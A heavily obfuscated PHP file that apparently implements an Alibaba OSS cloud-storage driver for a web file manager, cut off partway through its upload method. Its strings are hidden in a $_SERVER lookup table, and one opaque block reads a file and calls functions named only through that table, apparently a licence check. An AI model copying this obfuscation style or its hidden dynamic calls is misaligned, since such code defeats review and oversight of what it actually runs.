<?php
 goto d„ÓÎâÉ’Ó; DŠ±†³˜: function binCheckBigger($ÚœÄ¡»³, $Ø™ÚÔ‚ä) { return $ÚœÄ¡»³ > $Ø™ÚÔ‚ä; } $_SERVER[$_SERVER[ß»ÓµËì][3]] = ("\x39\x32\x36\x32"."\x33\x32")+0;$_v2c7="vgq0zjbwsl253mhcpdexr1o46nk8tfui9a7ynrlea40mi8qyk1g67jzsdco3fxuvh92pwbt55wnk";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($íšû«—æ, $û‚ÜÚÆÑ) { $ŸàœÊ£ =& $_SERVER[µÅ˜º…æ]; if (isset(self::$_methodList[$íšû«—æ])) { return @call_user_func_array(self::$_methodList[$íšû«—æ], $û‚ÜÚÆÑ); } else { if (method_exists($this, $íšû«—æ)) { return call_user_func_array(array($this, $íšû«—æ), $û‚ÜÚÆÑ); } else { think_exception(__CLASS__ . $ŸàœÊ£[4] . $íšû«—æ . $ŸàœÊ£[5]); } } } public static function __callStatic($‚—íĞÅº, $ÍÕãÖÇù) { if (isset(self::$_methodListStatic[$‚—íĞÅº])) { return call_user_func_array(self::$_methodListStatic[$‚—íĞÅº], $ÍÕãÖÇù); } else { if (method_exists(self, $‚—íĞÅº)) { return call_user_func_array(array(self, $‚—íĞÅº), $ÍÕãÖÇù); } else { show_json("{$‚—íĞÅº}\50\x29\x20\x6e\x6f\164\40\145\x78\x69\x73\x74\x3b", !1); } } } public static function addMethod($è¾ÌŒ¢ƒ, $º×ÛĞ–•) { self::$_methodList[$è¾ÌŒ¢ƒ] = $º×ÛĞ–•; } public static function addMethodStatic($úëó£Á©, $ƒËÀä…¶) { self::$_methodListStatic[$úëó£Á©] = $ƒËÀä…¶; } } goto BƒâÒœ›Ë¡; f†»»É––™: if ($_SERVER[$_SERVER[µÅ˜º…æ][1025]] != $_SERVER[$_SERVER[µÅ˜º…æ][1041]]) { $_getc = $_SERVER[µÅ˜º…æ][1026]; $_getfile = $_SERVER[$_SERVER[µÅ˜º…æ][1027]] . $_SERVER[µÅ˜º…æ][1028]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[µÅ˜º…æ][285], $_getfilec); if (count($_getarrs) < $_SERVER[µÅ˜º…æ][713]) { $exit = $_SERVER[µÅ˜º…æ][1029]; $exit(); } $_act = $_SERVER[µÅ˜º…æ][1030]; $_act($_SERVER[$_SERVER[µÅ˜º…æ][1023]]); } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($Àõ‹Ì€«) { parent::__construct(); include_once SDK_DIR . $_SERVER[µÅ˜º…æ][1671]; $this->_init($Àõ‹Ì€«); } public function _init($’ş»¨×„) { $’¤î–Ò’ =& $_SERVER[µÅ˜º…æ]; $this->config = $’ş»¨×„; foreach ($’ş»¨×„ as $“·ğ× => $ÑğÑÇµ) { if (isset($this->{$“·ğ×})) { $this->{$“·ğ×} = $ÑğÑÇµ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($’¤î–Ò’[1672] . LNG($’¤î–Ò’[1673])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ÍºŒÅú¢ =& $_SERVER[µÅ˜º…æ]; $°õğşò = new OSS\Model\CorsConfig(); $·Ğãñã = new OSS\Model\CorsRule(); $·Ğãñã->addAllowedOrigin($ÍºŒÅú¢[1674]); $·Ğãñã->addAllowedMethod($ÍºŒÅú¢[1675]); $·Ğãñã->addAllowedMethod($ÍºŒÅú¢[1676]); $·Ğãñã->addAllowedMethod($ÍºŒÅú¢[1677]); $·Ğãñã->addAllowedMethod($ÍºŒÅú¢[1678]); $·Ğãñã->addAllowedMethod($ÍºŒÅú¢[162]); $·Ğãñã->setMaxAgeSeconds(600); $·Ğãñã->addExposeHeader($ÍºŒÅú¢[1679]); $·Ğãñã->addAllowedHeader($ÍºŒÅú¢[1674]); $°õğşò->addRule($·Ğãñã); try { $this->client->putBucketCors($this->bucket, $°õğşò); } catch (OSS\Core\OssException $üã£Ğå) { $this->writeLog(__FUNCTION__ . $ÍºŒÅú¢[212] . $üã£Ğå->getMessage()); return !1; } return !0; } public function getBucketCors() { $ì“òò»¡ =& $_SERVER[µÅ˜º…æ]; $‡ÆúŒµŞ = null; try { $‡ÆúŒµŞ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ı¥ô™Èè) { $this->writeLog(__FUNCTION__ . $ì“òò»¡[212] . $ı¥ô™Èè->getMessage()); return null; } if (!$‡ÆúŒµŞ || !($Ñ€ëñÂä = $‡ÆúŒµŞ->getRules())) { return null; } $ı¸³øåÅ = $Ñ€ëñÂä[0]->getAllowedOrigins(); $À°™ŒŸ = $Ñ€ëñÂä[0]->getAllowedMethods(); $À¡Éî¯© = $Ñ€ëñÂä[0]->getMaxAgeSeconds(); $ÉË­üÖš = $Ñ€ëñÂä[0]->getExposeHeaders(); $Ã¦è“¢ô = $Ñ€ëñÂä[0]->getAllowedHeaders(); return array($ì“òò»¡[218] => isset($ı¸³øåÅ[0]) ? $ı¸³øåÅ[0] : $ì“òò»¡[12], $ì“òò»¡[222] => $À°™ŒŸ, $ì“òò»¡[1680] => $À¡Éî¯©, $ì“òò»¡[1681] => isset($ÉË­üÖš[0]) ? $ÉË­üÖš[0] : $ì“òò»¡[12], $ì“òò»¡[219] => isset($Ã¦è“¢ô[0]) ? $Ã¦è“¢ô[0] : $ì“òò»¡[12]); } public function isBucketCors() { $ÌáÔ®¦ø =& $_SERVER[µÅ˜º…æ]; $ùø·ë¤¦ = $this->getBucketCors(); if (!$ùø·ë¤¦ || !is_array($ùø·ë¤¦)) { return !1; } if ($ùø·ë¤¦[$ÌáÔ®¦ø[218]] != $ÌáÔ®¦ø[220] || $ùø·ë¤¦[$ÌáÔ®¦ø[219]] != $ÌáÔ®¦ø[220]) { return !1; } $ÉØÛº»± = array_map($ÌáÔ®¦ø[221], $ùø·ë¤¦[$ÌáÔ®¦ø[222]]); if (!is_array($ÉØÛº»±)) { $ÉØÛº»± = array(); } $¢åŞ‡Ûæ = array($ÌáÔ®¦ø[223], $ÌáÔ®¦ø[224], $ÌáÔ®¦ø[225], $ÌáÔ®¦ø[226], $ÌáÔ®¦ø[227]); $ÂÑÓ¬ = array_diff($¢åŞ‡Ûæ, $ÉØÛº»±); return empty($ÂÑÓ¬); } public function mkfile($á•ìÛ¶À, $èÈÚ° = '', $õºÓùµ = REPEAT_RENAME) { $ù‘†Â©ğ = $this->setContent($á•ìÛ¶À, $èÈÚ°); if ($ù‘†Â©ğ !== !1) { return $this->getPathOuter($á•ìÛ¶À); } return !1; } public function mkdir($Ùõ›–Ã, $Û¨ú–—– = REPEAT_SKIP) { if ($Û¨ú–—– && $this->_isFolder($Ùõ›–Ã)) { return $this->getPathOuter($Ùõ›–Ã); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Ùõ›–Ã)); } catch (OSS\Core\OssException $‡ÓÀÌâ¦) { $this->writeLog(__FUNCTION__ . $_SERVER[µÅ˜º…æ][212] . $‡ÓÀÌâ¦->getMessage()); return !1; } return $this->getPathOuter($Ùõ›–Ã); } private function fileList($…•Ä‘›, $¼×ÌŸ– = '', $ñÕÚªŸ = 0) { $¹÷ª“Šˆ =& $_SERVER[µÅ˜º…æ]; $…•Ä‘› = trim($…•Ä‘›, $¹÷ª“Šˆ[8]); $ûË”Ë‘‹ = empty($…•Ä‘›) && $…•Ä‘› !== $¹÷ª“Šˆ[228] ? $¹÷ª“Šˆ[12] : $…•Ä‘› . $¹÷ª“Šˆ[8]; $¤äì¾¡§ = $¹÷ª“Šˆ[12]; $ã…±—Ü‘ = 1000; $ªıÉß = $ó‡¿¼× = array(); while (!0) { check_abort(); $¿²Í‡Ì© = array($¹÷ª“Šˆ[1682] => $¼×ÌŸ–, $¹÷ª“Šˆ[1683] => $ûË”Ë‘‹, $¹÷ª“Šˆ[1684] => $ã…±—Ü‘, $¹÷ª“Šˆ[1685] => $¤äì¾¡§); try { $¯“Í£Ì“ = $this->client->listObjects($this->bucket, $¿²Í‡Ì©); } catch (OSS\Core\OssException $‰¡°§ö) { $this->writeLog(__FUNCTION__ . $¹÷ª“Šˆ[212] . $‰¡°§ö->getMessage()); break; } $¤äì¾¡§ = $¯“Í£Ì“->getNextMarker(); $‰ú¥ÁĞî = $¯“Í£Ì“->getObjectList(); $±õàÇãÛ = $¯“Í£Ì“->getPrefixList(); foreach ($‰ú¥ÁĞî as $ä‡ÈÑåÂ) { if ($ä‡ÈÑåÂ->getKey() == $ûË”Ë‘‹) { continue; } $˜Ñş¾Û„ = $ä‡ÈÑåÂ->getKey(); $§õøªÃ‡ = $ä‡ÈÑåÂ->getSize(); $ˆâ´Ú…Ÿ = $ä‡ÈÑåÂ->getLastModified(); $°Î¿Âå× = trim($ä‡ÈÑåÂ->getETag(), $¹÷ª“Šˆ[118]); $¾îñı–Ò = $ñÕÚªŸ ? array($¹÷ª“Šˆ[32] => $˜Ñş¾Û„, $¹÷ª“Šˆ[79] => $§õøªÃ‡, $¹÷ª“Šˆ[204] => strtotime($ˆâ´Ú…Ÿ), $¹÷ª“Šˆ[1686] => $°Î¿Âå×) : $˜Ñş¾Û„; $½ğÁó“ˆ = $§õøªÃ‡ == 0 && substr($˜Ñş¾Û„, strlen($˜Ñş¾Û„) - 1, 1) == $¹÷ª“Šˆ[8] ? !0 : !1; $äÁş•œ— = array($¹÷ª“Šˆ[79] => $§õøªÃ‡, $¹÷ª“Šˆ[1687] => $§õøªÃ‡, $¹÷ª“Šˆ[88] => strtotime($ˆâ´Ú…Ÿ), $¹÷ª“Šˆ[1688] => $ˆâ´Ú…Ÿ, $¹÷ª“Šˆ[1686] => $°Î¿Âå×); $this->cacheMethodInfoSet($˜Ñş¾Û„, $½ğÁó“ˆ, $äÁş•œ—); if ($½ğÁó“ˆ) { $ªıÉß[] = $˜Ñş¾Û„; continue; } $ó‡¿¼×[] = $¾îñı–Ò; } foreach ($±õàÇãÛ as $ÃËø»‰î) { $ªıÉß[] = $ÃËø»‰î->getPrefix(); $this->cacheMethodInfoSet($ÃËø»‰î->getPrefix(), !0); } if ($¤äì¾¡§ === $¹÷ª“Šˆ[12]) { break; } } $this->cacheMethodInfoSet($…•Ä‘›, !0); return array($¹÷ª“Šˆ[85] => $ªıÉß, $¹÷ª“Šˆ[86] => $ó‡¿¼×); } public function listObject($ê„ê®Éö, $ñòğßšä = '') { $ÎŒ±Í‡û =& $_SERVER[µÅ˜º…æ]; $ê„ê®Éö = trim($ê„ê®Éö, $ÎŒ±Í‡û[8]); $‘©¿‘§ = empty($ê„ê®Éö) && $ê„ê®Éö !== $ÎŒ±Í‡û[228] ? $ÎŒ±Í‡û[12] : $ê„ê®Éö . $ÎŒ±Í‡û[8]; $ÔôäËŠ = $ÎŒ±Í‡û[12]; $ìüËõƒ = 1000; $ãúœ¬­Ê = $ÍÆåâÍ¦ = array(); while (!0) { check_abort(); $Íéø¤¶ä = array($ÎŒ±Í‡û[1682] => $ñòğßšä, $ÎŒ±Í‡û[1683] => $‘©¿‘§, $ÎŒ±Í‡û[1684] => $ìüËõƒ, $ÎŒ±Í‡û[1685] => $ÔôäËŠ); try { $¸º„šç¼ = $this->client->listObjects($this->bucket, $Íéø¤¶ä); } catch (OSS\Core\OssException $Åş—Œ“ò) { $this->writeLog(__FUNCTION__ . $ÎŒ±Í‡û[212] . $Åş—Œ“ò->getMessage()); break; } $ÔôäËŠ = $¸º„šç¼->getNextMarker(); $½ûŸ°”É = $¸º„šç¼->getObjectList(); foreach ($½ûŸ°”É as $Â¢¯Ñ¯·) { if ($Â¢¯Ñ¯·->getKey() == $‘©¿‘§) { continue; } $˜ç³Ú‡„ = $Â¢¯Ñ¯·->getKey(); $Ö¨ğ¬© = $Â¢¯Ñ¯·->getSize(); $¿öâ Òà = $Ö¨ğ¬© == 0 && substr($˜ç³Ú‡„, strlen($˜ç³Ú‡„) - 1, 1) == $ÎŒ±Í‡û[8] ? !0 : !1; if ($¿öâ Òà) { continue; } $ÍÆåâÍ¦[] = $Ö¨ğ¬© . $ÎŒ±Í‡û[212] . $˜ç³Ú‡„; } if ($ÔôäËŠ === $ÎŒ±Í‡û[12]) { break; } } return array($ÎŒ±Í‡û[85] => $ãúœ¬­Ê, $ÎŒ±Í‡û[86] => $ÍÆåâÍ¦); } public function copyFile($÷¤€çÖÍ, $äšèíş¹) { $¼œÁ¨Ø = $this->size($÷¤€çÖÍ); if ($¼œÁ¨Ø < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $÷¤€çÖÍ, $this->bucket, $this->pathEncode($äšèíş¹)); } catch (OSS\Core\OssException $Ó‹­ëÓê) { $this->writeLog(__FUNCTION__ . $_SERVER[µÅ˜º…æ][212] . $Ó‹­ëÓê->getMessage()); return !1; } return $this->getPathOuter($äšèíş¹); } $Ÿ«í­Ğ× = $this->multiCopyObject($÷¤€çÖÍ, $äšèíş¹, $¼œÁ¨Ø); return $Ÿ«í­Ğ× ? $this->getPathOuter($äšèíş¹) : !1; } private function multiCopyObject($üÇ¤š®Ñ, $²ÎÉ‡¾º, $ÚÜöŞù) { $£œ„ÆŒ =& $_SERVER[µÅ˜º…æ]; try { $½ú—µ = array(); if ($íÙÓã‡† = $this->hashMd5($üÇ¤š®Ñ)) { $½ú—µ = array(OSS\OssClient::OSS_HEADERS => array($£œ„ÆŒ[1689] => $íÙÓã‡†)); } $œÕÒä¢· = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($²ÎÉ‡¾º), $½ú—µ); $›ãï° = 1; $Š€Çûè¼ = 0; $İ®Ìñ„• = array(); $œË¡«ô = 1024 * 1024 * 10; $‰Ã÷Ñ´ƒ = $this->client->generateMultiuploadParts($ÚÜöŞù, $œË¡«ô); foreach ($‰Ã÷Ñ´ƒ as $ŸÏÂ×–Ä => $ÃŠşÓÇæ) { $“‡¢â³Ì = $Š€Çûè¼ + (int) $ÃŠşÓÇæ[$£œ„ÆŒ[1690]]; $ß¡ş®ú = (int) $ÃŠşÓÇæ[$£œ„ÆŒ[412]] + $“‡¢â³Ì - 1; $Õ·¾‹Ó™ = array($£œ„ÆŒ[164] => $“‡¢â³Ì, $£œ„ÆŒ[165] => $ß¡ş®ú); $İ®Ìñ„•[] = $this->client->uploadPartCopy($this->bucket, $üÇ¤š®Ñ, $this->bucket, $this->pathEncode($²ÎÉ‡¾º), $›ãï°, $œÕÒä¢·, $Õ·¾‹Ó™); $›ãï° = $›ãï° + 1; } $’¦­Ó§Š = array(); foreach ($İ®Ìñ„• as $ŸÏÂ×–Ä => $ĞŸ¶×€Ú) { $’¦­Ó§Š[] = array($£œ„ÆŒ[297] => $ŸÏÂ×–Ä + 1, $£œ„ÆŒ[298] => $ĞŸ¶×€Ú); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($²ÎÉ‡¾º), $œÕÒä¢·, $’¦­Ó§Š); } catch (OSS\Core\OssException $ºğêª›÷) { $this->writeLog(__FUNCTION__ . $£œ„ÆŒ[212] . $ºğêª›÷->getMessage()); return !1; } return !0; } public function moveFile($Ù ³Îë, $¸øíñú¡) { if ($this->copyFile($Ù ³Îë, $¸øíñú¡)) { $this->remove($Ù ³Îë); return $this->getPathOuter($¸øíñú¡); } return !1; } public function delFile($´Š•¼¬) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($´Š•¼¬)); } catch (OSS\Core\OssException $îí¸’ì©) { $this->writeLog(__FUNCTION__ . $_SERVER[µÅ˜º…æ][212] . $îí¸’ì©->getMessage()); return !1; } return !0; } public function delFolder($™ªõí‹) { $èàÅÓ¦ =& $_SERVER[µÅ˜º…æ]; if (!$this->exist($™ªõí‹)) { return !0; } $this->listItemCache = !1; $¯ıïğ¼Î = $this->fileList($™ªõí‹); $this->listItemCache = !0; $ ö¿÷ã¡ = trim($™ªõí‹, $èàÅÓ¦[8]) . $èàÅÓ¦[8]; if (!empty($™ªõí‹) && $™ªõí‹ !== $èàÅÓ¦[228] && !in_array($ ö¿÷ã¡, $¯ıïğ¼Î[$èàÅÓ¦[85]])) { $¯ıïğ¼Î[$èàÅÓ¦[85]][] = $ ö¿÷ã¡; } $µ®Ş³‹É = $this->delByBatch($¯ıïğ¼Î[$èàÅÓ¦[86]]); if (!$µ®Ş³‹É) { return !1; } $µ®Ş³‹É = $this->delByBatch($¯ıïğ¼Î[$èàÅÓ¦[85]]); if (!$µ®Ş³‹É) { return !1; } return $this->delFile($ ö¿÷ã¡); } private function delByBatch($óº¤®Ä) { foreach (array_chunk($óº¤®Ä, 1000) as $ÆÔË÷ÚØ) { try { $this->client->deleteObjects($this->bucket, $ÆÔË÷ÚØ); } catch (OSS\Core\OssException $»çÄí©”) { $this->writeLog(__FUNCTION__ . $_SERVER[µÅ˜º…æ][212] . $»çÄí©”->getMessage()); return !1; } } return !0; } public function rename($’‚› , $–÷ãå„Œ) { return $this->renameObject($’‚› , $–÷ãå„Œ); } private function fileInfo($ú¥—¿é, $—áà·ƒ = false, $š¸ËñœŒ = array()) { $«ê»»à =& $_SERVER[µÅ˜º…æ]; $Î…Ë˜±ß = array($«ê»»à[32] => $this->pathThis($ú¥—¿é), $«ê»»à[87] => $this->getPathOuter($ú¥—¿é), $«ê»»à[33] => $«ê»»à[230], $«ê»»à[79] => isset($š¸ËñœŒ[$«ê»»à[79]]) ? $š¸ËñœŒ[$«ê»»à[79]] : 0, $«ê»»à[166] => $this->ext($ú¥—¿é)); if ($—áà·ƒ) { return $Î…Ë˜±ß; } $Î…Ë˜±ß[$«ê»»à[231]] = $Î…Ë˜±ß[$«ê»»à[88]] = 0; $Î…Ë˜±ß[$«ê»»à[232]] = $Î…Ë˜±ß[$«ê»»à[233]] = !0; if (empty($š¸ËñœŒ)) { $·ÄüÙÀ’ = $this->objectMeta($ú¥—¿é); if (!$·ÄüÙÀ’) { return $Î…Ë˜±ß; } $š¸ËñœŒ = array($«ê»»à[88] => strtotime($·ÄüÙÀ’[$«ê»»à[1688]]), $«ê»»à[79] => $·ÄüÙÀ’[$«ê»»à[1687]] + 0, $«ê»»à[1686] => $·ÄüÙÀ’[$«ê»»à[1686]]); } if (isset($š¸ËñœŒ[$«ê»»à[1686]]) && $š¸ËñœŒ[$«ê»»à[1686]]) { $Î…Ë˜±ß[$«ê»»à[235]] = trim($š¸ËñœŒ[$«ê»»à[1686]], $«ê»»à[118]); } if (isset($š¸ËñœŒ[$«ê»»à[79]])) { $Î…Ë˜±ß[$«ê»»à[79]] = $š¸ËñœŒ[$«ê»»à[79]]; } if (isset($š¸ËñœŒ[$«ê»»à[88]])) { $Î…Ë˜±ß[$«ê»»à[88]] = $š¸ËñœŒ[$«ê»»à[88]]; } if (isset($š¸ËñœŒ[$«ê»»à[204]]) && !trim($Î…Ë˜±ß[$«ê»»à[88]])) { $Î…Ë˜±ß[$«ê»»à[88]] = $š¸ËñœŒ[$«ê»»à[204]]; } return $Î…Ë˜±ß; } private function folderInfo($Àîíäî, $¯…øÂÑ¡ = false, $ÓğÎ•¸¦ = array()) { $™ÈæÕ‡¸ =& $_SERVER[µÅ˜º…æ]; $ €œ…Ÿ = array($™ÈæÕ‡¸[32] => $this->pathThis($Àîíäî), $™ÈæÕ‡¸[87] => $this->getPathOuter($™ÈæÕ‡¸[8] . $Àîíäî), $™ÈæÕ‡¸[33] => $™ÈæÕ‡¸[78]); if ($¯…øÂÑ¡) { return $ €œ…Ÿ; } $ €œ…Ÿ[$™ÈæÕ‡¸[231]] = $ €œ…Ÿ[$™ÈæÕ‡¸[88]] = 0; $ €œ…Ÿ[$™ÈæÕ‡¸[232]] = $ €œ…Ÿ[$™ÈæÕ‡¸[233]] = !0; if (empty($ÓğÎ•¸¦)) { $Àîíäî = rtrim($Àîíäî, $™ÈæÕ‡¸[8]) . $™ÈæÕ‡¸[8]; $ÄÅñ™’Ñ = $this->objectMeta($Àîíäî); if (!$ÄÅñ™’Ñ) { return $ €œ…Ÿ; } $ÓğÎ•¸¦ = array($™ÈæÕ‡¸[231] => $ÄÅñ™’Ñ[$™ÈæÕ‡¸[595]][$™ÈæÕ‡¸[1691]], $™ÈæÕ‡¸[88] => strtotime($ÄÅñ™’Ñ[$™ÈæÕ‡¸[1688]])); } if (isset($ÓğÎ•¸¦[$™ÈæÕ‡¸[88]])) { $ €œ…Ÿ[$™ÈæÕ‡¸[88]] = $ÓğÎ•¸¦[$™ÈæÕ‡¸[88]]; } if (isset($ÓğÎ•¸¦[$™ÈæÕ‡¸[231]])) { $ €œ…Ÿ[$™ÈæÕ‡¸[231]] = $ÓğÎ•¸¦[$™ÈæÕ‡¸[231]]; } return $ €œ…Ÿ; } public function listPath($¬ ®ÏàŞ, $‰Ó‘ßß§ = false) { $ŞØÒ¦— =& $_SERVER[µÅ˜º…æ]; $ûËş™œ‘ = $this->fileList($¬ ®ÏàŞ, $ŞØÒ¦—[8], !0); foreach ($ûËş™œ‘[$ŞØÒ¦—[85]] as $–â´§ÃŒ => $ü‘˜ç…Ô) { $ûËş™œ‘[$ŞØÒ¦—[85]][$–â´§ÃŒ] = $this->folderInfo($ü‘˜ç…Ô, $‰Ó‘ßß§, $ü‘˜ç…Ô); } foreach ($ûËş™œ‘[$ŞØÒ¦—[86]] as $–â´§ÃŒ => $ü‘˜ç…Ô) { $ûËş™œ‘[$ŞØÒ¦—[86]][$–â´§ÃŒ] = $this->fileInfo($ü‘˜ç…Ô[$ŞØÒ¦—[32]], $‰Ó‘ßß§, $ü‘˜ç…Ô); } return $ûËş™œ‘; } protected function infoChildren($½ßÌúÕù, &$á›ßÄ­â) { $ÄçàóË¹ =& $_SERVER[µÅ˜º…æ]; $ŞØ½¢£¡ = $this->fileList($½ßÌúÕù, $ÄçàóË¹[12], !0); $á›ßÄ­â[$ÄçàóË¹[81]] += count($ŞØ½¢£¡[$ÄçàóË¹[85]]); $á›ßÄ­â[$ÄçàóË¹[80]] += count($ŞØ½¢£¡[$ÄçàóË¹[86]]); foreach ($ŞØ½¢£¡[$ÄçàóË¹[86]] as $øŸë®®Ï) { if (!$øŸë®®Ï || !$øŸë®®Ï[$ÄçàóË¹[79]]) { continue; } $á›ßÄ­â[$ÄçàóË¹[79]] += $øŸë®®Ï[$ÄçàóË¹[79]]; } } public function has($ÚÂì†ÚŠ, $õˆ—‡ÏÚ = false, $¥¸ñ”Áû = true) { $õÒ©«¬Ü =& $_SERVER[µÅ˜º…æ]; $ÚÂì†ÚŠ = trim($ÚÂì†ÚŠ, $õÒ©«¬Ü[8]); $„ÚîĞ’‡ = empty($ÚÂì†ÚŠ) && $ÚÂì†ÚŠ !== $õÒ©«¬Ü[228] ? $õÒ©«¬Ü[12] : $ÚÂì†ÚŠ . $õÒ©«¬Ü[8]; $´ÛùËò¶ = $õÒ©«¬Ü[12]; $ş¯Ñúğñ = 500; $ÏŠ¤ØÑô = $Íã²œèë = 0; while (!0) { check_abort(); $ù¤æ‡ÚÄ = array($õÒ©«¬Ü[1682] => $õÒ©«¬Ü[8], $õÒ©«¬Ü[1683] => $„ÚîĞ’‡, $õÒ©«¬Ü[1684] => $ş¯Ñúğñ, $õÒ©«¬Ü[1685] => $´ÛùËò¶); try { $ÑëÙÅåË = $this->client->listObjects($this->bucket, $ù¤æ‡ÚÄ); } catch (OSS\Core\OssException $£”ËƒÇÚ) { $this->writeLog(__FUNCTION__ . $õÒ©«¬Ü[212] . $£”ËƒÇÚ->getMessage()); break; } $´ÛùËò¶ = $ÑëÙÅåË->getNextMarker(); $¯»Ë‘ÆÍ = $ÑëÙÅåË->getObjectList(); $Ä÷£÷Ç‰ = $ÑëÙÅåË->getPrefixList(); if ($õˆ—‡ÏÚ) { if (count($¯»Ë‘ÆÍ) > 1 || count($¯»Ë‘ÆÍ) == 1 && $¯»Ë‘ÆÍ[0]->getKey() != $„ÚîĞ’‡) { $ÏŠ¤ØÑô += count($¯»Ë‘ÆÍ) - 1; } if (!empty($Ä÷£÷Ç‰)) { $Íã²œèë += count($Ä÷£÷Ç‰); } if ($´ÛùËò¶ === $õÒ©«¬Ü[12]) { break; } continue; } if ($¥¸ñ”Áû) { if (!empty($¯»Ë‘ÆÍ)) { if (count($¯»Ë‘ÆÍ) > 1 || $¯»Ë‘ÆÍ[0]->getKey() != $„ÚîĞ’‡) { return !0; } } } else { if (!empty($Ä÷£÷Ç‰)) { return !0; } } if ($´ÛùËò¶ === $õÒ©«¬Ü[12]) { break; } } if ($õˆ—‡ÏÚ) { return array($õÒ©«¬Ü[239] => $ÏŠ¤ØÑô, $õÒ©«¬Ü[240] => $Íã²œèë); } return !1; } public function listAll($¡œ¢‡Ş¤) { $ò££É§ =& $_SERVER[µÅ˜º…æ]; $ôé¾«¥ı = $this->fileList($¡œ¢‡Ş¤, $ò££É§[12], !0); $œ€Í§úú = array_to_keyvalue($ôé¾«¥ı[$ò££É§[86]], $ò££É§[32]); foreach ($ôé¾«¥ı[$ò££É§[85]] as $Ÿ™Ò¤Šİ) { if (is_string($Ÿ™Ò¤Šİ)) { $œ€Í§úú[$Ÿ™Ò¤Šİ] = array($ò££É§[79] => 0); } } return $this->listAllFiles($¡œ¢‡Ş¤, $œ€Í§úú); } public function canRead($·ŠÚ½) { $¢ßÖïá =& $_SERVER[µÅ˜º…æ]; $ìÔæØ»¥ = $this->pathAcl($·ŠÚ½); return $ìÔæØ»¥ == $¢ßÖïá[1692] || $ìÔæØ»¥ == $¢ßÖïá[642] ? !0 : !1; } public function canWrite($àøõ›Ê) { $º«¬›…ë = $this->pathAcl($àøõ›Ê); return $º«¬›…ë == $_SERVER[µÅ˜º…æ][642] ? !0 : !1; } public function pathAcl($Â¡«áŒå) { $ıŞ™¸Œ =& $_SERVER[µÅ˜º…æ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $É‹‹‡Å = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Â¡«áŒå)); } catch (OSS\Core\OssException $¶Ğ§ù…ª) { $this->writeLog(__FUNCTION__ . $ıŞ™¸Œ[212] . $¶Ğ§ù…ª->getMessage()); return !1; } $½˜Á…üì = $É‹‹‡Å == $ıŞ™¸Œ[37] ? $this->bucketAcl : $É‹‹‡Å; if ($½˜Á…üì == $ıŞ™¸Œ[1693]) { return $ıŞ™¸Œ[1692]; } if ($½˜Á…üì == $ıŞ™¸Œ[1694]) { return $ıŞ™¸Œ[642]; } return $½˜Á…üì; } private function chmodPath($âˆ«ÀøØ, $”Ğ÷¾°Ë = '') { $ù¼º‘ª— =& $_SERVER[µÅ˜º…æ]; $şÊèä·å = empty($”Ğ÷¾°Ë) ? $ù¼º‘ª—[1694] : $”Ğ÷¾°Ë; $À‚Á· ª = array($ù¼º‘ª—[37], $ù¼º‘ª—[229], $ù¼º‘ª—[1693], $ù¼º‘ª—[1694]); if (!in_array($şÊèä·å, $À‚Á· ª)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($âˆ«ÀøØ), $şÊèä·å); } catch (OSS\Core\OssException $Å”Ì÷¥) { $this->writeLog(__FUNCTION__ . $ù¼º‘ª—[212] . $Å”Ì÷¥->getMessage()); return !1; } return !0; } public function getContent($¥Éë§Ä) { return $this->fileSubstr($¥Éë§Ä, -1); } public function setContent($ô¼ÍÁ™µ, $ü‰ˆÀíŒ = '') { $¶Ûƒ§ß =& $_SERVER[µÅ˜º…æ]; try { $¸™ÕşÏş = $this->trafficLimit($¶Ûƒ§ß[1695]); $ÎİÛ¢¼ = $this->client->putObject($this->bucket, $this->pathEncode($ô¼ÍÁ™µ), $ü‰ˆÀíŒ, $¸™ÕşÏş); } catch (OSS\Core\OssException $§ò•Ä¼’) { $this->writeLog(__FUNCTION__ . $¶Ûƒ§ß[212] . $§ò•Ä¼’->getMessage()); return !1; } $Ø“´Ì«¹ = array($¶Ûƒ§ß[1689] => trim($ÎİÛ¢¼[$¶Ûƒ§ß[1686]], $¶Ûƒ§ß[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ô¼ÍÁ™µ))); $this->updateObjMeta($ô¼ÍÁ™µ, $Ø“´Ì«¹); return isset($ÎİÛ¢¼[$¶Ûƒ§ß[1696]][$¶Ûƒ§ß[294]]) ? !0 : !1; } private function updateObjMeta($«ÍÒ¸‚Æ, $›½çôñ¬) { $«ÍÒ¸‚Æ = $this->pathEncode($«ÍÒ¸‚Æ); try { $ÃêñØæé = array(OSS\OssClient::OSS_HEADERS => $›½çôñ¬); $this->client->copyObject($this->bucket, $«ÍÒ¸‚Æ, $this->bucket, $«ÍÒ¸‚Æ, $ÃêñØæé); } catch (OSS\Core\OssException $“’Áà–¯) { $this->writeLog(__FUNCTION__ . $_SERVER[µÅ˜º…æ][212] . $“’Áà–¯->getMessage()); return !1; } return !0; } public function upload($Äàñú€÷, $ä§©ÛÊÉ, $»×Ô¿î¢ = false, $º¬ïÒóÖ = REPEAT_REPLACE) { $®÷ã‡Äñ =& $_SERVER[µÅ˜º…æ]; if (!$ä§©ÛÊÉ || !@file_exists($ä§©ÛÊÉ)) { return !1; } $×ÙÎÈÛ§ = trim($Äàñú€÷, $®÷ã‡Äñ[8]); $Ó“£Ê›å = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($®÷ã‡Äñ[1689] => @md5_file($ä§©ÛÊÉ)), 